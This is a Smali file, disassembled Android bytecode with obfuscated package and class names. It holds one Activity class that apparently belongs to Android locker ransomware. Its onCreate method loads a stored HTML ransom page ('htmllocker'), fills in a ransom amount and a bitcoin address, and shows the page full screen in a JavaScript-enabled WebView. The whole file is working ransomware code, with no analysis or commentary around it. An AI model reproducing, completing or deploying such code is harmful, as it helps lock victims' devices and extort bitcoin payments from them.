.class public Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;
.super Landroid/app/Activity;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$a;,
        Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$b;
    }
.end annotation


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "htmllocker"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "lock_amount"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "lock_btc"

    invoke-virtual {v1, p0, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "<amount>"

    invoke-virtual {p1, v2, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "<bitcoin>"

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    new-instance v0, Landroid/webkit/WebView;

    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v1, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$b;

    const/4 v2, 0x0

    invoke-direct {v1, p0, v2}, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$b;-><init>(Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$1;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v1, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$a;

    invoke-direct {v1, p0, v2}, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$a;-><init>(Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt$1;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    const-string v1, "text/html"

    const-string v2, "UTF-8"

    invoke-virtual {v0, p1, v1, v2}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;->setContentView(Landroid/view/View;)V

    return-void
.end method
